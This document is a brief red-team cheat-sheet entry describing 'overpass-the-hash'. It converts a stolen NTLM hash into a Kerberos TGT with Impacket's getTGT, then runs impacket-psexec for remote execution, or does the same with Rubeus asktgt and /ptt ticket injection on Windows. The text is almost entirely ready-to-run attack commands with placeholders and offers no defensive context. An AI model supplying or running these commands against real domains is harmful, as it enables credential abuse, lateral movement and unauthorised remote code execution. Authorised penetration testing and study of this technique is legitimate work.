Use an NTLM hash as a Kerberos RC4 key to request a genuine TGT from the domain controller.

**When to use:** You have an NTLM hash but need Kerberos authentication, for example when NTLM is unavailable or you need to access a Kerberos-only service.

KALI Impacket
#### Request a TGT using the NTLM hash
```
impacket-getTGT domain.local/user -hashes ':<NTLM_HASH>' -dc-ip <DC_IP>
```
#### Set the ticket
```
export KRB5CCNAME=user.ccache
```
#### Use the TGT for Kerberos authentication
```
impacket-psexec -k -no-pass domain.local/user@target.domain.local
```

---

# Windows - Rubeus

```
Rubeus.exe asktgt /user:user /domain:domain.local /rc4:<NTLM_HASH> /ptt
```

`/ptt` injects the returned ticket into the current logon session